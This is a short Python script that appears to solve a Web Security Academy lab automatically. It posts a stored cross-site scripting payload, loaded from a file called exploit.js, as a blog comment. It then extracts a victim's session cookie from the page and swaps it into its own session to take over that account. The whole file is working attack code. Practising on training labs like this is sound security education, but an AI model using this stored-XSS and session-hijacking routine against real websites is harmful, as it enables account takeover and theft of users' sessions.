from web_security_academy.core.logger import logger
from web_security_academy.core.utils import read_file

import re


def solve_lab(session):
    xss = read_file("exploit.js").decode()
    xss = f'<script type="module">{xss}</script>'

    csrf = session.get_csrf_token("/post?postId=1")
    data = {
        "csrf": csrf,
        "postId": 1,
        "comment": xss,
        "name": "user",
        "email": "user@example.com",
        "website": "",
    }
    session.post_path("/post/comment", data=data)
    logger.info("Commented the following payload:\n")
    print(xss, end="\n\n")

    resp = session.get_path("/post?postId=1")
    regex = r"session=([A-Za-z0-9\+\/]+)"
    cookie = re.search(regex, resp.text).group(1)
    logger.info(f"Extracted session cookie: {cookie}")
    session.cookies.clear_session_cookies()
    session.cookies.set("session", cookie)
    session.get_path("/")
